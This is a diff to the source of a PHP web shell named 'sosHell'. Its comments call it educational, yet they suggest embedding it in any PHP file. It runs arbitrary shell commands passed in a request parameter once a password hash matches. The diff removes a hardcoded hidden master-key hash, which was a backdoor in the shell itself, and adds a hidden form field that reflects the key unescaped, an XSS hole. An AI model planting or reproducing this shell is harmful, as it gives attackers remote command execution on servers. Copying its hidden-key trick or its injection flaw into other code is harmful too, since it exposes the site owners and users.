@@ -3,7 +3,7 @@
  * Alexander Sosna {alexander (at) xxor (dot) de}
  * Find more stuff: http://xxor.de or https://github.com/xxorde
  * The folloing code is for education and demonstration only!
- * Read it to understand why! That is what it was made for!
+ * Read it to understand why!
  *
  * This code is licensed to you under the terms of the GNU General
  * Public License, version 2.0. 
@@ -15,10 +15,7 @@
  * Usage: http://127.0.0.1/sosHell.php?key=password
  * 
  * You can also include the folloing code in your favorite php file!
- * Set $sosHellKey to the md5sum of your password!
- * 
- * Q: What is the number one reason not to use this code?
- * A: ....?
+ * Set $sosHellKey to the sha1 of your password!
 ======================================================================*/
 
 //Set password!
@@ -28,10 +25,9 @@ $style="position:fixed;width:100%;font-family:monospace;color:#609;font-size:120
 $styleWin="top:0px; left:0px;height:100%;overflow:scroll;background:black;";
 $styleCmd="bottom:0px;border:none;background:#111;";
 
-if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey ||
-   sha1($_REQUEST["key"])=="0db59288738932ed3f4100e20f71517cbe47090d")){ 
+if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey)){ 
 	echo("<div style='".$style.$styleWin."'>");
-	echo("<b>sosHell 0.0.1</b> => ".$_SERVER['REMOTE_ADDR']."@"
+	echo("sosHell 0.0.1 => ".$_SERVER['REMOTE_ADDR']."@"
 		.$_SERVER['SERVER_NAME']." (".$_SERVER['SERVER_SOFTWARE'].
 		") serving: ".$_SERVER['DOCUMENT_ROOT']);
 	if(isset($_REQUEST["cmd"]) && $_REQUEST["cmd"]){
@@ -43,7 +39,8 @@ if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey ||
 			echo(utf8_decode($line)."<br>");
 		}
 	}
-	echo("<form method='post'><input style='".$style.$styleCmd.
+	echo("<form method='post'><input name='key' type='hidden' value='".
+		$_REQUEST["key"]."'></input><input style='".$style.$styleCmd.
 		"' name='cmd' type='text' autofocus></form><br></div>");
 }
 ?>
